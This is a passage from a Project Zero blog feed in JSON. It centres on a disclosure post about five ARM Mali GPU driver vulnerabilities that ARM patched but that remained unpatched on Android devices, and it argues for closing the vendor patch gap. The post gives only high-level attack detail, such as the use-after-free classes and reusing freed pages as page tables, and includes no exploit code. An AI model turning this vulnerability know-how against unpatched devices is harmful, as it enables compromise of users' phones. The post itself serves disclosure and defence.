Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/2515628030502752973"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/2515628030502752973"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html","@title":"Exploiting CVE-2022-42703 - Bringing back the stack attack"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/s72-w508-h640-c/image3.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-7519748497805371118","published":"2022-11-22T13:05:00.000-08:00","updated":"2022-11-22T13:05:40.148-08:00","title":{"@type":"text","#text":"Mind the Gap"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=OPeqXG-QxW3ZD8BtmPikfA');.lst-kix_9apzkelodq30-0&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_9apzkelodq30-6{list-style-type:none}ul.lst-kix_9apzkelodq30-7{list-style-type:none}ul.lst-kix_9apzkelodq30-4{list-style-type:none}ul.lst-kix_9apzkelodq30-5{list-style-type:none}ul.lst-kix_9apzkelodq30-2{list-style-type:none}ul.lst-kix_9apzkelodq30-3{list-style-type:none}ul.lst-kix_9apzkelodq30-0{list-style-type:none}.lst-kix_9apzkelodq30-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_9apzkelodq30-1{list-style-type:none}.lst-kix_9apzkelodq30-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_9apzkelodq30-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_9apzkelodq30-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9apzkelodq30-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9apzkelodq30-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_9apzkelodq30-8{list-style-type:none}.lst-kix_9apzkelodq30-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9apzkelodq30-2&gt;li:before{content:\"\\0025a0  \"}ol{margin:0;padding:0}table td,table th{padding:0}.HwIiAvYVxJ-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.HwIiAvYVxJ-c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.HwIiAvYVxJ-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HwIiAvYVxJ-c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\"}.HwIiAvYVxJ-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HwIiAvYVxJ-c3{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HwIiAvYVxJ-c10{background-color:#ffffff;font-size:10.5pt;font-family:\"Roboto\";font-weight:400}.HwIiAvYVxJ-c8{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HwIiAvYVxJ-c1{color:inherit;text-decoration:inherit}.HwIiAvYVxJ-c11{background-color:#ffffff}.HwIiAvYVxJ-c2{font-style:italic}.HwIiAvYVxJ-c5{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;body class=\"c8 doc-content\"&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;By Ian Beer, Project Zero &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c2\"&gt;Note: The vulnerabilities discussed in this blog post (CVE-2022-33917) are fixed by the upstream vendor, but at the time of publication, t&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c2 HwIiAvYVxJ-c11\"&gt;hese fixes have not yet made it downstream to affected Android devices (including Pixel, Samsung, Xiaomi, Oppo and others). Devices with a Mali GPU are currently vulnerable.&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c9 HwIiAvYVxJ-c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HwIiAvYVxJ-c7\" id=\"h.mvgq8h546lfi\"&gt;&lt;span class=\"HwIiAvYVxJ-c6\"&gt;Introduction&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;In June 2022, Project Zero researcher Maddie Stone gave a talk at &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://www.first.org/conference/2022/\"&gt;FirstCon22&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;titled &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html\"&gt;0-day In-the-Wild Exploitation in 2022…so far&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. A key takeaway was that approximately 50% of the observed 0-days in the first half of 2022 were variants of previously patched vulnerabilities. This finding is consistent with our understanding of attacker behavior: &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c10\"&gt;attackers will take the path of least resistance, and as long as vendors don't consistently perform thorough root-cause analysis when fixing security vulnerabilities, it will continue to be worth investing time in trying to revive known vulnerabilities before looking for novel ones&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;The presentation discussed an in the wild exploit targeting the Pixel 6 and leveraging CVE-2021-39793, a vulnerability in the ARM Mali GPU driver used by a large number of other Android devices. ARM's advisory described the vulnerability as: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c2\"&gt;Title&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Mali GPU Kernel Driver may elevate CPU RO pages to writable&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c2\"&gt;CVE&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2022-22706 (also reported in CVE-2021-39793)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c2\"&gt;Date of issue&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;6th January 2022 &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c2\"&gt;Impact&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;A non-privileged user can get a write access to read-only memory pages [&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c2\"&gt;sic&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;].&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;The week before FirstCon22, Maddie gave an internal preview of her talk. Inspired by the description of an in-the-wild vulnerability in low-level memory management code, fellow Project Zero researcher Jann Horn started auditing the ARM Mali GPU driver. Over the next three weeks, Jann found five more exploitable vulnerabilities (&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2325\"&gt;2325&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2327\"&gt;2327&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2331\"&gt;2331&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2333\"&gt;2333&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2334\"&gt;2334&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;).&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HwIiAvYVxJ-c7\" id=\"h.9l9fwyug2cxl\"&gt;&lt;span class=\"HwIiAvYVxJ-c6\"&gt;Taking a closer look&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;One of these issues (&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2334\"&gt;2334&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) lead to kernel memory corruption, one (&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2331\"&gt;2331&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) lead to physical memory addresses being disclosed to userspace and the remaining three (&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2325\"&gt;2325&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2327\"&gt;2327&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2333\"&gt;2333&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;) lead to a physical page use-after-free condition. These would enable an attacker to continue to read and write physical pages after they had been returned to the system.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;For example, by forcing the kernel to &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html\"&gt;reuse these pages as page tables&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;, an attacker with native code execution in an app context could gain full access to the system, bypassing Android's permissions model and allowing broad access to user data.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;Anecdotally, we heard from multiple sources that the Mali issues we had reported collided with vulnerabilities available in the 0-day market, and we even saw one &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://twitter.com/jgrusko/status/1571921203723440135\"&gt;public reference&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s1420/tweet.png\" style=\"display: block; padding: 1em 0; text-align: center;\"&gt;&lt;img alt=\"@ProjectZeroBugs\\nArm Mali: driver exposes physical addresses to unprivileged userspace\\n\\n\n @jgrusko Replying to @ProjectZeroBugs\\nRIP the feature that was there forever and nobody wanted to report :)\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s1200/tweet.png\" title=\"@ProjectZeroBugs\\nArm Mali: driver exposes physical addresses to unprivileged userspace\\n\\n\n @jgrusko Replying to @ProjectZeroBugs\\nRIP the feature that was there forever and nobody wanted to report :)\" width=\"640/\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HwIiAvYVxJ-c7\" id=\"h.r9ws488aqcv6\"&gt;&lt;span class=\"HwIiAvYVxJ-c6\"&gt;The \"Patch gap\" is for vendors, too&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;We reported these five issues to ARM when they were discovered between June and July 2022. ARM fixed the issues promptly in July and August 2022, disclosing them as security issues on their &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://developer.arm.com/Arm%20Security%20Center/Mali%20GPU%20Driver%20Vulnerabilities\"&gt;Arm Mali Driver Vulnerabilities&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;page (assigning &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-36449\"&gt;CVE-2022-36449&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) and publishing the &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://developer.arm.com/downloads/-/mali-drivers/valhall-kernel\"&gt;patched driver source on their public developer website&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;In line with our &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html\"&gt;2021 disclosure policy update&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;we then waited an additional 30 days before derestricting our Project Zero tracker entries. Between late August and mid-September 2022 we derestricted these issues in the public Project Zero tracker: &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2325\"&gt;2325&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2327\"&gt;2327&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2331\"&gt;2331&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2333\"&gt;2333&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2334\"&gt;2334&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span&gt;When time permits and as an additional check, we test the effectiveness of the patches that the vendor has provided. This sometimes leads to follow-up bug reports where a patch is incomplete or a variant is discovered (for a recently compiled list of examples, see &lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c3\"&gt;&lt;a class=\"HwIiAvYVxJ-c11\" href=\"https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html\"&gt;the first table in this blogpost&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;), and sometimes we discover the fix isn't there at all. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;In this case we discovered that all of our test devices which used Mali are still vulnerable to these issues. CVE-2022-36449 is not mentioned in any downstream security bulletins.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HwIiAvYVxJ-c7\" id=\"h.yanf95yf2fn7\"&gt;&lt;span class=\"HwIiAvYVxJ-c6\"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;Just as users are recommended to patch as quickly as they can once a release containing security updates is available, so the same applies to vendors and companies. Minimizing the \"patch gap\" as a vendor in these scenarios is arguably more important, as end users (or other vendors downstream) are blocking on this action before they can receive the security benefits of the patch.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;Companies need to remain vigilant, follow upstream sources closely, and do their best to provide complete patches to users as soon as possible. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HwIiAvYVxJ-c4 HwIiAvYVxJ-c5\"&gt;&lt;span class=\"HwIiAvYVxJ-c0\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/7519748497805371118/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/7519748497805371118"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/7519748497805371118"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html","@title":"Mind the Gap"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s72-c/tweet.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-5910791167813767823","published":"2022-11-04T08:50:00.003-07:00","updated":"2023-01-10T09:48:35.767-08:00","title":{"@type":"text","#text":"A Very Powerful Clipboard: Analysis of a Samsung in-the-wild exploit chain"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol.lst-kix_gtv3l2c5wia7-3.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-3 0}ol.lst-kix_lsx8wn19rrkf-0.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-0 0}.lst-kix_hbruetvjkelf-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_hbruetvjkelf-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_gtv3l2c5wia7-3&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-3}.lst-kix_olk2lnn0afau-5&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-5}ol.lst-kix_gtv3l2c5wia7-6.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-6 0}.lst-kix_lsx8wn19rrkf-4&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-4}.lst-kix_gtv3l2c5wia7-5&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-5,lower-roman) \". \"}.lst-kix_gtv3l2c5wia7-2&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-2}.lst-kix_gtv3l2c5wia7-4&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-4,lower-latin) \". \"}.lst-kix_hbruetvjkelf-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_gtv3l2c5wia7-6&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-6,decimal) \". \"}.lst-kix_hbruetvjkelf-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_gtv3l2c5wia7-7&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-7,lower-latin) \". \"}ol.lst-kix_lsx8wn19rrkf-3.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-3 0}.lst-kix_lsx8wn19rrkf-5&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-5}.lst-kix_gtv3l2c5wia7-8&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-8,lower-roman) \". \"}.lst-kix_lsx8wn19rrkf-2&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-2}.lst-kix_hbruetvjkelf-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_hbruetvjkelf-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_hbruetvjkelf-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_hbruetvjkelf-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_hbruetvjkelf-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_olk2lnn0afau-0.start{counter-reset:lst-ctn-kix_olk2lnn0afau-0 0}ol.lst-kix_olk2lnn0afau-6.start{counter-reset:lst-ctn-kix_olk2lnn0afau-6 0}.lst-kix_olk2lnn0afau-7&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-7}ol.lst-kix_lsx8wn19rrkf-6.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-6 0}ol.lst-kix_olk2lnn0afau-3.start{counter-reset:lst-ctn-kix_olk2lnn0afau-3 0}.lst-kix_olk2lnn0afau-4&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-4}ol.lst-kix_gtv3l2c5wia7-5{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-6{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-7{list-style-type:none}.lst-kix_olk2lnn0afau-0&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-0,decimal) \". 